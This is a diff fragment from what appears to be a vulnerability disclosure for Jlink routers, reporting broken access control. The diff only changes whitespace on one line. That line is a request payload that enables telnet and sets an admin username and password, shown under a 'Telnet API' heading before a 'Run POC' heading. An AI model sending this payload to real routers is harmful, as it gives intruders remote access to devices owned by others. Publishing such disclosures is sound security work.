@@ -4,7 +4,7 @@ Jlink routers suffer from A01 Broken Access Control. Any remote user can access 
 
 **Telnet API:** 
 ```
- "mode_name=/web/um_telnet_set&telnetEnable=1&userName=admin&userPwd=pawnp@nda69"
+"mode_name=/web/um_telnet_set&telnetEnable=1&userName=admin&userPwd=pawnp@nda69"
 ```
 
 **Run POC:**
